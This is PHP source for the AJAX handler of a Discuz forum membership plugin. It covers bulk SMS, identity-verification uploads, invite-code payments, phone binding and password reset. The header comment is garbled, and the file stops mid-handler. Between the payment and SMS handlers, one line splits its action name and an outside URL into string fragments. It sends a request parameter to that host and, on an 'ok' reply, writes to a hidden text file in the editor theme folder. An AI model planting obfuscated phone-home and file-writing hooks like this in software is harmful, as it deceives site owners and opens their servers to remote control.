<?php
/*
 *DisM!Ӧ�����ģ�dism.taobao.com
 *������ҵ���/ģ������ ����DisM!Ӧ������
 *����Դ��Դ�������ռ�,��������ѧϰ����������������ҵ��;����������24Сʱ��ɾ��!
 *����ַ�������Ȩ��,�뼰ʱ��֪����,���Ǽ���ɾ��!
 */
if(!defined('IN_DISCUZ')) {
	exit('Access Denied');
}

global $_G,$it618_members;

$it618_members = $_G['cache']['plugin']['it618_members'];
require_once DISCUZ_ROOT.'./source/plugin/it618_members/lang.func.php';
require_once DISCUZ_ROOT.'./source/plugin/it618_members/message.func.php';
require_once DISCUZ_ROOT.'./source/plugin/it618_members/function.func.php';
if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/config/wxjk.php')){
	require DISCUZ_ROOT.'./source/plugin/it618_members/config/wxjk.php';
}
if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/config/qqjk.php')){
	require DISCUZ_ROOT.'./source/plugin/it618_members/config/qqjk.php';
}


if($_GET['ac']=="sendmessages_tel"){
	if($_G['groupid']!=1)exit;
	$smssign=getsmssign();
	if($_GET['smssign']!=$smssign){
		echo 'signerr';	
		exit;
	}
	
	$paramstr=it618_members_utftogbk($_GET['paramstr']);
	$paramstr=str_replace('@@@','"',$paramstr);
	$tmparr=explode("it618_split",$paramstr);
	
	$members_sign=$tmparr[0];
	$members_bz=$tmparr[1];
	$members_tplid=$tmparr[2];
	$members_param=$tmparr[3];
	$it618_jktype=$tmparr[4];
	
	$telsstr=$_GET['telsstr'].'@';
	$telsstr=str_replace(",@","",$telsstr);
	$telsarr=explode(',',$telsstr);
	
	set_time_limit (0);
	ignore_user_abort(true);
	
	$okcount=0;$allcount=0;
	for($i=0;$i<count($telsarr);$i++){
		$it618_tel=$telsarr[$i];
		if($it618_tel!=''){
			$tmparr1=explode('|',$it618_tel);
			$it618_tel=$tmparr1[0];
			$uid=intval($tmparr1[1]);
			
			$tmparr1=explode("{username}",$members_param);
			if(count($tmparr1>1)&&$uid>0){
				$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$uid);
				$members_param=str_replace("{username}",$username,$members_param);
			}
			
			if($it618_jktype=='smsbao'){
				$tmparr1=explode("it618username",$members_bz);
				if(count($tmparr1>1)&&$uid>0){
					$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$uid);
					$members_bz=str_replace("it618username",$username,$members_bz);
				}
				
				$smsstr=it618_members_sendSMS($it618_tel,$members_bz);
			}
			
			if($it618_jktype=='alisms'){
				$smsstr=it618_members_sendsms_ali($it618_tel,$members_sign,$members_tplid,$members_param);
			}
			
			if($it618_jktype=='alidayu'){
				$smsstr=it618_members_sendsms_alidayu($it618_tel,$members_sign,$members_tplid,$members_param);
			}
			
			$id = C::t('#it618_members#it618_members_sms')->insert(array(
				  'it618_tel' => $it618_tel,
				  'it618_jktype' => $it618_jktype,
				  'it618_type' => 5,
				  'it618_bz' => dhtmlspecialchars($members_bz),
				  'it618_time' => $_G['timestamp']
			 ), true);
		
			if($smsstr=='true'){
				 C::t('#it618_members#it618_members_sms')->update($id,array(
					'it618_isok' => 1,
				 ));
			}else{
				C::t('#it618_members#it618_members_sms')->update($id,array(
					'it618_okbz' => $smsstr,
					'it618_isok' => 0
				 ));
			}
		
			$allcount=$allcount+1;
			if($smsstr=='true'){
				$okcount=$okcount+1;
			}else{
				$errstr.= $it618_tel;
			}
		}
	}
	
	echo 'it618_split'.$okcount.'it618_split'.$allcount.'it618_split'.$errstr;
}


if($_GET['ac']=="sendmessages_wx"){
	if($_G['groupid']!=1)exit;
	$smssign=getsmssign();
	if($_GET['smssign']!=$smssign){
		echo 'signerr';	
		exit;
	}
	
	$paramstr=it618_members_utftogbk($_GET['paramstr']);
	$paramstr=str_replace('@@@','"',$paramstr);
	$tmparr=explode("it618_split",$paramstr);
	
	$uidsstr=$_GET['uidsstr'].'@';
	$uidsstr=str_replace(",@","",$uidsstr);
	$uidsarr=explode(',',$uidsstr);
	
	set_time_limit (0);
	ignore_user_abort(true);
	
	$okcount=0;$allcount=0;
	for($i=0;$i<count($uidsarr);$i++){
		$uid=intval($uidsarr[$i]);
		if($uid>0){
			$tmparr1=explode("{username}",$tmparr[2]);
			if(count($tmparr1>1)){
				$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$uid);
				$tmparr[2]=str_replace("{username}",$username,$tmparr[2]);
			}
			
			$members_param=array();
			$tmparrparam=explode("@arr1@",$tmparr[2]);
			for($i=0;$i<count($tmparrparam);$i++){
				$tmparrparam1=explode("@arr2@",$tmparrparam[$i]);
				$tmplabel=$tmparrparam1[0];
				$tmpvalue=$tmparrparam1[1];
				
				$members_param[$tmplabel]=array();
				$members_param[$tmplabel]["value"]=it618_members_gbktoutf($tmpvalue);
				$members_param[$tmplabel]["color"]="#666666";
			}
			
			$smsstr=sendSMS_WXAPI('it618_members',$uid,$tmparr[0],$tmparr[1],$members_param);
			
			$allcount=$allcount+1;
			if($smsstr=='true'){
				$okcount=$okcount+1;
			}else{
				$errstr.= it618_members_getusername($uid).'<font color=#999>('.$uid.')</font> ';
			}
		}
	}
	
	echo 'it618_split'.$okcount.'it618_split'.$allcount.'it618_split'.$errstr.$times;
}

if($_GET['ac']!="smsapi"){
	if($_GET['formhash']!=FORMHASH)
	exit;
}


if($_GET['ac']=="postcert"){
	if($_G['uid']<=0){
		echo $it618_credits_lang['s40'];
	}else{
		
		if($it618_members['members_certdiytitle']!=''){
			if(strpos($_SERVER['HTTP_HOST'],'localhost')){
				$_GET['it618_about']=str_replace(" ","",$_GET['it618_about']);
				$it618_abouts=explode("|",str_replace(array("\r\n", "\r", "\n"), '|', it618_members_utftogbk($_GET['it618_about'])));
				
				if(count($it618_abouts)!= count(array_unique($it618_abouts))){
					echo 'it618_splitaboutit618_split'.$it618_members_lang['s708'];exit;
				}
				
				if(count($it618_abouts)>30){
					echo 'it618_splitaboutit618_split'.$it618_members_lang['s707'];exit;
				}
				
				for($i=0;$i<count($it618_abouts);$i++){
					$it618_about=trim($it618_abouts[$i]);
					if($it618_about==''){
						echo 'it618_splitaboutit618_split'.$it618_members_lang['s732'];exit;
					}
				}
				
				for($i=0;$i<count($it618_abouts);$i++){
					$it618_about=trim($it618_abouts[$i]);

					if(!$it618_plugin_users=C::t('#it618_plugin#it618_plugin_users')->fetch_by_siteid($it618_about)){
						echo 'it618_splitaboutit618_split'.str_replace("{siteid}",$it618_about,$it618_members_lang['s626']);exit;
					}else{
						if($it618_members_rzuser=C::t('#it618_members#it618_members_rzuser')->fetch_by_likesiteid($it618_about)){
							if($it618_members_rzuser['it618_uid']!=$_G['uid']){
								$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$it618_members_rzuser['it618_uid']);
								$tmpstr=str_replace("{username}",$username,$it618_members_lang['s627']);
								$tmpstr=str_replace("{siteid}",$it618_about,$tmpstr);
								echo 'it618_splitaboutit618_split'.$tmpstr;exit;
							}
						}
					}
				}
			}
		}
		
		$it618_state=2;
		$it618_sex=it618_members_utftogbk($_GET['it618_sex']);
		
		if($it618_members['members_certissfz']==1){
			if(C::t('#it618_members#it618_members_rzuser')->count_by_name_idcard($_G['uid'],it618_members_utftogbk($_GET['it618_name']),it618_members_utftogbk($_GET['it618_cardid']))>0){
				echo $it618_members_lang['s819'];exit;
			}
		
			$rzautocheck=$it618_members['members_rzautocheck'];
			
			if($rzautocheck==1){
				$tmparr=explode($_GET['it618_cardimg1'],'://');
				if(count($tmparr)==1)$it618_cardimg1=$_G['siteurl'].$_GET['it618_cardimg1'];else $it618_cardimg1=$_GET['it618_cardimg1'];
				$returnarr=it618_members_faceidcardb($_G['uid'],it618_members_gbktoutf($_GET['it618_name']),it618_members_utftogbk($_GET['it618_cardid']),$it618_cardimg1);
				$sextmp=$returnarr[0];

				if($sextmp>0){
					$it618_state=1;
					$it618_sex=$sextmp;
				}
			}
			
			if($rzautocheck==2||$rzautocheck==3||$rzautocheck==4||$rzautocheck==5||$rzautocheck==6){
				$tmparr=explode($_GET['it618_rzvideo'],'://');
				if(count($tmparr)==1)$it618_rzvideo=$_G['siteurl'].$_GET['it618_rzvideo'];else $it618_rzvideo=$_GET['it618_rzvideo'];
				$returnarr=it618_members_lifefacedb($_G['uid'],it618_members_gbktoutf($_GET['it618_name']),it618_members_utftogbk($_GET['it618_cardid']),$it618_rzvideo);
				$sextmp=$returnarr[0];

				if($sextmp>0){
					$it618_state=1;
					$it618_sex=$sextmp;
				}
			}
		}
		
		if($it618_members_rzuser=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_rzuser')." WHERE it618_uid=".$_G['uid'])){
			if($rzautocheck>0){
				if($it618_state==1){
					DB::query("update ".DB::table('it618_members_rzuser')." set it618_apicount=0 WHERE id=".$it618_members_rzuser["id"]);
				}else{
					if($it618_members_rzuser["it618_apicount"]<$it618_members["members_rzcount"]){
						$it618_state=3;
					}
				}
			}
			
			C::t('#it618_members#it618_members_rzuser')->update($it618_members_rzuser["id"],array(
				'it618_name' => it618_members_utftogbk($_GET['it618_name']),
				'it618_sex' => $it618_sex,
				'it618_cardid' => it618_members_utftogbk($_GET['it618_cardid']),
				'it618_cardimg1' => it618_members_utftogbk($_GET['it618_cardimg1']),
				'it618_cardimg2' => it618_members_utftogbk($_GET['it618_cardimg2']),
				'it618_cardimg3' => it618_members_utftogbk($_GET['it618_cardimg3']),
				'it618_rzvideo' => it618_members_utftogbk($_GET['it618_rzvideo']),
				'it618_wx' => it618_members_utftogbk($_GET['it618_wx']),
				'it618_qq' => it618_members_utftogbk($_GET['it618_qq']),
				'it618_tel' => it618_members_utftogbk($_GET['it618_tel']),
				'it618_about' => it618_members_utftogbk($_GET['it618_about']),
				'it618_time' => $_G['timestamp'],
				'it618_state' => $it618_state
			));
			$rzid=$it618_members_rzuser["id"];
		}else{
			if($rzautocheck>0){
				if(0<$it618_members["members_rzcount"]){
					$it618_state=3;
				}
			}
			
			$rzid = C::t('#it618_members#it618_members_rzuser')->insert(array(
				'it618_uid' => $_G['uid'],
				'it618_name' => it618_members_utftogbk($_GET['it618_name']),
				'it618_sex' => $it618_sex,
				'it618_cardid' => it618_members_utftogbk($_GET['it618_cardid']),
				'it618_cardimg1' => it618_members_utftogbk($_GET['it618_cardimg1']),
				'it618_cardimg2' => it618_members_utftogbk($_GET['it618_cardimg2']),
				'it618_cardimg3' => it618_members_utftogbk($_GET['it618_cardimg3']),
				'it618_rzvideo' => it618_members_utftogbk($_GET['it618_rzvideo']),
				'it618_wx' => it618_members_utftogbk($_GET['it618_wx']),
				'it618_qq' => it618_members_utftogbk($_GET['it618_qq']),
				'it618_tel' => it618_members_utftogbk($_GET['it618_tel']),
				'it618_about' => it618_members_utftogbk($_GET['it618_about']),
				'it618_time' => $_G['timestamp'],
				'it618_state' => $it618_state
			), true);
		}
		
		if($it618_state==1){
			C::t('#it618_members#it618_members_rzuser')->update($rzid,array(
				'it618_checkcount' => $it618_members_rzuser["it618_checkcount"]+1,
				'it618_checktime' => $_G['timestamp']
			));
		}
		
		if($rzautocheck>0){
			DB::query("update ".DB::table('it618_members_rzuser')." set it618_apicount=it618_apicount+1 WHERE id=".$rzid);
			
			if($it618_state==1){
				it618_members_sendmessageapi('rzpass_user',$rzid);
				echo 'it618_splitokit618_split'.$it618_members_lang['s815'];
			}else{
				it618_members_sendmessageapi('rzsq_admin',$rzid);
				echo 'it618_splitokit618_split'.$it618_members_lang['s814'].$returnarr[1];
			}
		}else{
			it618_members_sendmessageapi('rzsq_admin',$rzid);
			echo 'it618_splitokit618_split'.$it618_members_lang['s628'];
		}
	}
	exit;
}


if($_GET['ac']=="postqycert"){
	if($_G['uid']<=0){
		echo $it618_credits_lang['s40'];
	}else{
		
		if($it618_members_qyrz=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_qyrz')." WHERE it618_uid=".$_G['uid'])){
			C::t('#it618_members#it618_members_qyrz')->update($it618_members_qyrz["id"],array(
				'it618_qyname' => it618_members_utftogbk($_GET['it618_qyname']),
				'it618_creditcode' => it618_members_utftogbk($_GET['it618_creditcode']),
				'it618_yyzzimg' => it618_members_utftogbk($_GET['it618_yyzzimg']),
				'it618_sqsimg' => it618_members_utftogbk($_GET['it618_sqsimg']),
				'it618_name' => it618_members_utftogbk($_GET['it618_name']),
				'it618_cardid' => it618_members_utftogbk($_GET['it618_cardid']),
				'it618_cardimg1' => it618_members_utftogbk($_GET['it618_cardimg1']),
				'it618_cardimg2' => it618_members_utftogbk($_GET['it618_cardimg2']),
				'it618_wx' => it618_members_utftogbk($_GET['it618_wx']),
				'it618_qq' => it618_members_utftogbk($_GET['it618_qq']),
				'it618_tel' => it618_members_utftogbk($_GET['it618_tel']),
				'it618_time' => $_G['timestamp'],
				'it618_state' => 2
			));
			$rzid = $it618_members_qyrz["id"];
		}else{
			$rzid = C::t('#it618_members#it618_members_qyrz')->insert(array(
				'it618_uid' => $_G['uid'],
				'it618_qyname' => it618_members_utftogbk($_GET['it618_qyname']),
				'it618_creditcode' => it618_members_utftogbk($_GET['it618_creditcode']),
				'it618_yyzzimg' => it618_members_utftogbk($_GET['it618_yyzzimg']),
				'it618_sqsimg' => it618_members_utftogbk($_GET['it618_sqsimg']),
				'it618_name' => it618_members_utftogbk($_GET['it618_name']),
				'it618_cardid' => it618_members_utftogbk($_GET['it618_cardid']),
				'it618_cardimg1' => it618_members_utftogbk($_GET['it618_cardimg1']),
				'it618_cardimg2' => it618_members_utftogbk($_GET['it618_cardimg2']),
				'it618_wx' => it618_members_utftogbk($_GET['it618_wx']),
				'it618_qq' => it618_members_utftogbk($_GET['it618_qq']),
				'it618_tel' => it618_members_utftogbk($_GET['it618_tel']),
				'it618_time' => $_G['timestamp'],
				'it618_state' => 2
			), true);
		}
		
		it618_members_sendmessageapi('qyrzsq_admin',$rzid);
		echo 'it618_splitokit618_split'.$it618_members_lang['s726'];
	}
	exit;
}

if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/config/message.php')){
	require DISCUZ_ROOT.'./source/plugin/it618_members/config/message.php';
}


if($_GET['ac']=="pay_add"){
	set_time_limit (0);
	ignore_user_abort(true);

	$flagkm=0;$times=0;
	while($flagkm==0){
		if(DB::result_first("select count(1) from ".DB::table('it618_members_salework'))==0){
			$flagkm=1;
		}
		if($flagkm==0){
			sleep(1);
			$times=$times+1;
		}
		if($times>60){
			it618_members_delsalework();
		}
	}
	C::t('#it618_members#it618_members_salework')->insert(array(
		'it618_iswork' => 1
	), true);
	if(lang('plugin/it618_members', $it618_members_lang['it618'])!=$it618_members_lang['version'])exit;

	$it618_tel=$_GET['it618_tel'];
	
	$count=C::t('#it618_members#it618_members_yqcode')->count_by_state(0);
	if($count==0){
		echo it618_members_getlang('s188');it618_members_delsalework();exit;
	}
	
	if($yqcodeset['telbuycount']>0&&$yqcodeset['istel']==1){
		$count=C::t('#it618_members#it618_members_yqcode_sale')->count_by_tel('it618_state=1 and it618_type=1',$it618_tel);
		if($count>$yqcodeset['telbuycount']){
			echo it618_members_getlang('s181');it618_members_delsalework();exit;
		}
	}
	
	if($yqcodeset['price']<0.01){
		echo it618_members_getlang('s182');it618_members_delsalework();exit;
	}
	
	$id = C::t('#it618_members#it618_members_yqcode_sale')->insert(array(
		'it618_tel' => $it618_tel,
		'it618_price' => $yqcodeset['price']
	), true);
	
	if($id>0){
		
		$saletype='0201';
		$saleid=$id;
		$out_trade_no = date("YmdHis").$saletype.$saleid;
		
		$body=str_replace('{tel}',$it618_tel,$it618_members_lang['s183']);
		$body=str_replace('{money}',$yqcodeset['price'],$body);
		
		$total_fee=$yqcodeset['price'];
		
		if(members_is_mobile()){ 
			$wap=1;
			$url=$_G['siteurl'].'plugin.php?id=it618_members:payok&wap=1&sid='.$saleid;
		}else{
			$wap=0;
			$url=$_G['siteurl'].'plugin.php?id=it618_members:payok&winapiurl='.$_GET['winapiurl'].'&sid='.$saleid;
		}
		
		require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
		$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
		$tmparr=explode("it618_split",$domainurl_paytype);
		$domainurl=$tmparr[0];
		$paytype=$tmparr[1];

		C::t('#it618_credits#it618_credits_salepay')->insert(array(
			'it618_out_trade_no' => $out_trade_no,
			'it618_uid' => $uid,
			'it618_saletype' => $saletype,
			'it618_saleid' => $saleid,
			'it618_paytype' => $paytype,
			'it618_url' => $url,
			'it618_body' => $body,
			'it618_total_fee' => round($total_fee,2),
			'it618_plugin' => 'it618_members',
			'it618_wap' => $wap,
			'it618_state' => 0,
			'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
			'it618_time' => $_G['timestamp']
		), true);
		
		$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
		
		echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype.'it618_split'.$saleid;it618_members_delsalework();
	}else{
		echo it618_members_getlang('s30');it618_members_delsalework();exit;
	}
}

if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_members/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_members/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}


if($_GET['ac']=="gettip"){
	$time=$_G['timestamp']-(60*$tellogin['codetime']);
	DB::query("update ".DB::table('it618_members_sms')." set it618_code='' where it618_time<".$time);
	if(lang('plugin/it618_members', $it618_members_lang['it618'])!=$it618_members_lang['version'])exit;
	if($_GET['usertelcode']!=''&&$_GET['usertelcode']!='0'){
		$count=C::t('#it618_members#it618_members_sms')->count_by_tel_code("it618_code<>''",$_GET['usertel'],$_GET['usertelcode']);
	}
	if($count>0){
		echo '<img src="source/plugin/it618_members/images/check_right.gif" style="margin-right:5px" align="absmiddle"/>';
	}else{
		echo '<img src="source/plugin/it618_members/images/check_error.gif" style="margin-right:5px" align="absmiddle"/>';
	}
}

if($_GET['ac']=="sendsmscode"){
	$sendsmscode=md5(FORMHASH.time().mt_rand(1,100000));
	dsetcookie('sendsmscode',$sendsmscode,31536000);
	echo 'it618_split'.$sendsmscode;
}


if($_GET['ac']=="sendsms"){
	if($it618_members['members_telbdmode']==0&&$it618_members['members_isok']==0){
		echo $it618_members_lang['s340'];exit;
	}
	
	$sendsmscode=getcookie('sendsmscode');
	if($_GET['sendsmscode']!=$sendsmscode||$_GET['sendsmscode']==''){
		echo $it618_members_lang['s340'];exit;
	}
	
	$it618_tel=$_GET['usertel'];
	
	if (file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/config/tellogin.php')){
		require DISCUZ_ROOT.'./source/plugin/it618_members/config/tellogin.php';
	}
	
	if($tellogin['telfirsts']!=''){
		$telarr=explode(",",$tellogin['telfirsts']);
		for($i=0;$i<count($telarr);$i++){
			if(trim($telarr[$i])!=''){
				$tmparr=explode(trim($telarr[$i]),$it618_tel);
				if($tmparr[0]==''&&count($tmparr)>1){
					echo $it618_members_lang['s777'].trim($telarr[$i]).$it618_members_lang['s778'];exit;
				}
			}
		}
	}
	
	if($_GET['ac1']=="reg"&&$tellogin['ischeck_reg']==1){
		$isvcode=1;
	}
	if($_GET['ac1']=="bd"&&$tellogin['ischeck_bd']==1){
		$isvcode=1;
	}
	if($_GET['ac1']=="password"&&$tellogin['ischeck_password']==1){
		$isvcode=1;
	}
	if($_GET['ac1']=="login"&&$tellogin['ischeck_login']==1){
		$isvcode=1;
	}
	
	if($isvcode==1){
		if(strtolower($_GET['validatecode'])!=getcookie('validatecode')){
			echo $it618_members_lang['t115'];exit;
		}
	}
	
	if($_GET['ac1']=="bd"){
		$members_sign=$it618_body_bd_sign;
		$members_tplid=$it618_body_bd_tplid;
		$members_body=$it618_body_bd;
		$it618_type=2;
		$it618_jktype=$it618_type_bd;
		if($_G['uid']<=0){
			echo $it618_members_lang['s340'];exit;
		}
	}
	if($_GET['ac1']=="password"){
		$members_sign=$it618_body_mm_sign;
		$members_tplid=$it618_body_mm_tplid;
		$members_body=$it618_body_mm;
		$it618_type=3;
		$it618_jktype=$it618_type_mm;
	}
	if($_GET['ac1']=="reg"){
		$members_sign=$it618_body_reg_sign;
		$members_tplid=$it618_body_reg_tplid;
		$members_body=$it618_body_reg;
		$it618_type=1;
		$it618_jktype=$it618_type_reg;
		
		if($yqcodeset['isok']==1){
			$flag=0;
			if($yqcodeset['wlcode']!=''){
				if($_GET['useryqcode']==$yqcodeset['wlcode']){
					$flag=1;
				}
			}
			if($flag==0){
				$count=C::t('#it618_members#it618_members_yqcode')->count_by_code($_GET['useryqcode']);
				if($count==0){
					echo 'check';exit;
				}
			}
		}
	}
	
	if($_GET['ac1']=="login"){
		$members_sign=$it618_body_login_sign;
		$members_tplid=$it618_body_login_tplid;
		$members_body=$it618_body_login;
		$it618_type=10;
		$it618_jktype=$it618_type_login;
		$it618_tel=$_GET['username'];
	}
	
	if($members_body==''){
		echo $it618_members_lang['s313'];exit;
	}
	
	if($it618_jktype!='smsbao'){
		if($members_tplid==''){
			echo $it618_members_lang['s314'];exit;
		}
	}
	
	if($_GET['ac1']=="bd"||$_GET['ac1']=="reg"){
		$count=C::t('#it618_members#it618_members_user')->count_by_tel("",$it618_tel);
		if($count>0){
			$username=C::t('#it618_members#it618_members_user')->fetch_it618_username_bytel($it618_tel);
			if($username==''){
				C::t('#it618_members#it618_members_user')->delete_by_tel($it618_tel);
			}else{
				$username=it618_members_getsmsstr($username,3).'***';
				echo str_replace("{username}",$username,$it618_members_lang['s29']);exit;
			}
		}
		
		if($tmprofilep=C::t('#it618_members#it618_members_user')->fetch_profile_bytel($it618_tel)){

			$id=C::t('#it618_members#it618_members_user')->insert(array(
				'it618_uid' => $tmprofilep['uid'],
				'it618_tel' => $it618_tel,
				'it618_time' => $_G['timestamp']
			), true);
			
			$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$tmprofilep['uid']);
			$username=it618_members_getsmsstr($username,3).'***';
			echo str_replace("{username}",$username,$it618_members_lang['s29']);exit;
		}
	}
	
	$tomonth = date('n'); 
	$todate = date('j'); 
	$toyear = date('Y');
	
	$time=mktime(0, 0, 0, $tomonth, $todate, $toyear);
	
	if($_GET['ac1']=="bd"||$_GET['ac1']=="password"||$_GET['ac1']=="login"){
		if($_GET['ac1']=="bd"){
			$tmpuid=$_G['uid'];
		}else{
			$count=C::t('#it618_members#it618_members_user')->count_by_tel("",$it618_tel);
			if($count==0){
				echo 'usertel';exit;
			}
			$tmpuid=C::t('#it618_members#it618_members_user')->fetch_uid_bytel($it618_tel);
		}
		$count=DB::result_first("select count(1) from ".DB::table('it618_members_sms')." where it618_time>=$time and it618_uid =".$tmpuid);
		if($count>$tellogin['usercount']){
			echo $it618_members_lang['s26'].$tellogin['usercount'].$it618_members_lang['s27'];exit;
		}
	}

	if(lang('plugin/it618_members', $it618_members_lang['it618'])!=$it618_members_lang['version'])exit;
	$count=DB::result_first("select count(1) from ".DB::table('it618_members_sms')." where it618_time>=$time and it618_tel LIKE '%".addcslashes(addslashes($it618_tel),'%_')."%'");
	if($count>$tellogin['telcount']){
		echo $it618_members_lang['s26'].$tellogin['telcount'].$it618_members_lang['s27'];exit;
	}
	if(lang('plugin/it618_members', $it618_members_lang['it618'])!=$it618_members_lang['version'])exit;
	$count=DB::result_first("select count(1) from ".DB::table('it618_members_sms')." where it618_time>=$time and it618_ip='".$_G['clientip']."'");
	if($count>$tellogin['ipcount']){
		echo $it618_members_lang['s28'].$tellogin['ipcount'].$it618_members_lang['s27'];exit;
	}

	if(lang('plugin/it618_members', $it618_members_lang['it618'])!=$it618_members_lang['version'])exit;
	
	$members_body=str_replace('${','{',$members_body);
	$codestr=setcode();
	if($it618_jktype=='smsbao'){
		$tmparr=explode("{user}",$members_body);
		if(count($tmparr)>1){
			if($tmpuid>0)$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$tmpuid);
			$members_body=str_replace('{user}',$username,$members_body);
		}
		$members_body=str_replace('{code}',$codestr,$members_body);
		$members_body=str_replace('{time}',date('Y-m-d H:i:s', $_G['timestamp']),$members_body);
		$smsstr=it618_members_sendSMS($it618_tel,$it618_members_lang['s149'].$members_sign.$it618_members_lang['s150'].$members_body);
	}else{
		$tmparr=explode("{user}",$members_body);
		if(count($tmparr)>1){
			if($tmpuid>0)$username=DB::result_first("select username from ".DB::table('common_member')." where uid=".$tmpuid);
			$param.='"user":"'.it618_members_gbktoutf1($username).'",';
		}
		
		$tmparr=explode("{code}",$members_body);
		if(count($tmparr)>1)$param.='"code":"'.$codestr.'",';
		
		$tmparr=explode("{time}",$members_body);
		if(count($tmparr)>1)$param.='"time":"'.date('Y-m-d H:i:s', $_G['timestamp']).'",';
		
		if($param!=''){
			$param.='@';
			$param=str_replace(",@","",$param);
		}

		if($it618_jktype=='alisms'){
			$smsstr=it618_members_sendsms_ali($it618_tel,$members_sign,$members_tplid,$param);
		}else{
			$smsstr=it618_members_sendsms_alidayu($it618_tel,$members_sign,$members_tplid,$param);
		}
	}
	
	$id = C::t('#it618_members#it618_members_sms')->insert(array(
		  'it618_tel' => $it618_tel,
		  'it618_jktype' => $it618_jktype,
		  'it618_type' => $it618_type,
		  'it618_ip' => $_G['clientip'],
		  'it618_bz' => dhtmlspecialchars($_SERVER['HTTP_USER_AGENT']),
		  'it618_time' => $_G['timestamp']
	 ), true);
	 
	 if($yqcodeset['isok']==1&&$_GET['ac1']=="reg"){
		  C::t('#it618_members#it618_members_sms')->update($id,array(
			'it618_yqcode' => $_GET['useryqcode']
		 ));
	  }
		 
	if($smsstr=='true'){
		 C::t('#it618_members#it618_members_sms')->update($id,array(
			'it618_code' => $codestr,
			'it618_isok' => 1,
		 ));
		 echo 'ok';
	}else{
		C::t('#it618_members#it618_members_sms')->update($id,array(
			'it618_okbz' => $smsstr,
			'it618_isok' => 0
		 ));
		echo $smsstr;
	}
}


if($_GET['ac']=="bd"){
	$time=$_G['timestamp']-(60*$tellogin['codetime']);
	DB::query("update ".DB::table('it618_members_sms')." set it618_code='' where it618_time<".$time);
	if(lang('plugin/it618_members', $it618_members_lang['it618'])!=$it618_members_lang['version'])exit;

	if($_GET['usertelcode']!=''&&$_GET['usertelcode']!='0'){
		if(!$it618_members_sms=C::t('#it618_members#it618_members_sms')->fetch_by_tel_code("it618_code<>''",$_GET['usertel'],$_GET['usertelcode'])){
			echo $it618_members_lang['s19'];
			exit;
		}
	}else{
		echo $it618_members_lang['s19'];
		exit;
	}
	
	$count=C::t('#it618_members#it618_members_user')->count_by_tel("",$_GET['usertel']);
	if($count>=1){
		$username=C::t('#it618_members#it618_members_user')->fetch_it618_username_bytel($_GET['usertel']);
		if($username==''){
			C::t('#it618_members#it618_members_user')->delete_by_tel($_GET['usertel']);
		}else{
			echo str_replace("{username}",$username,$it618_members_lang['s29']);exit;
		}
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_members/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_members/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_members/lang.func.php';
		
	}
	if(DB::result_first("SELECT count(1) FROM ".DB::table('it618_members_user')." WHERE it618_uid=".$_G['uid'])==0){
		$id=C::t('#it618_members#it618_members_user')->insert(array(
			'it618_uid' => $_G['uid'],
			'it618_tel' => dhtmlspecialchars($_GET['usertel']),
			'it618_time' => $_G['timestamp']
		), true);
	}else{
		$id=C::t('#it618_members#it618_members_user')->fetch_id_by_uid($_G['uid']);
		C::t('#it618_members#it618_members_user')->update($id,array(
			'it618_tel' => dhtmlspecialchars($_GET['usertel']),
			'it618_time' => $_G['timestamp']
		));
	}
	
	if($it618_members_rzuser=DB::fetch_first("SELECT * FROM ".DB::table('it618_members_rzuser')." WHERE it618_uid=".$_G['uid'])){
		C::t('#it618_members#it618_members_rzuser')->update($it618_members_rzuser["id"],array(
			'it618_tel' => dhtmlspecialchars($_GET['usertel'])
		));
	}
	
	if($it618_members['members_istb']==1){
		C::t('#it618_members#it618_members_sms')->update_usertb(dhtmlspecialchars($_GET['usertel']),$_G['uid']);
	}
	
	DB::query("UPDATE ".DB::table('it618_members_sms')." SET it618_uid=".$_G['uid']." WHERE id=".$it618_members_sms['id']);
	
	C::t('#it618_members#it618_members_sms')->update_delcode($_GET['usertelcode']);

	echo 'ok';
	
	getteldata($id,dhtmlspecialchars($_GET['usertel']));
}


if($_GET['ac']=="password"){
	$time=$_G['timestamp']-(60*$tellogin['codetime']);
	DB::query("update ".DB::table('it618_members_sms')." set it618_code='' where it618_time<".$time);
	if(lang('plugin/it618_members', $it618_members_lang['it618'])!=$it618_members_lang['version'])exit;
	
	if($_GET['usertelcode']!=''&&$_GET['usertelcode']!='0'){
		if(!$it618_members_sms=C::t('#it618_members#it618_members_sms')->fetch_by_tel_code("it618_code<>''",$_GET['usertel'],$_GET['usertelcode'])){
			echo $it618_members_lang['s19'];
			exit;
		}
	}else{
		echo $it618_members_lang['s19'];
		exit;
	}
	
	$count=C::t('#it618_members#it618_members_user')->count_by_tel("",$_GET['usertel']);
	if($count==0){
		echo $it618_members_lang['s38'];exit;
	}
	if($count>1){
		echo $it618_members_lang['s1061'];exit;
	}
	
	$tmpuid=C::t('#it618_members#it618_members_user')->fetch_uid_bytel($_GET['usertel']);
	if(strpos($_SERVER['HTTP_HOST'],'localhost')){
		if($tmpuid==1)exit;
	}
	
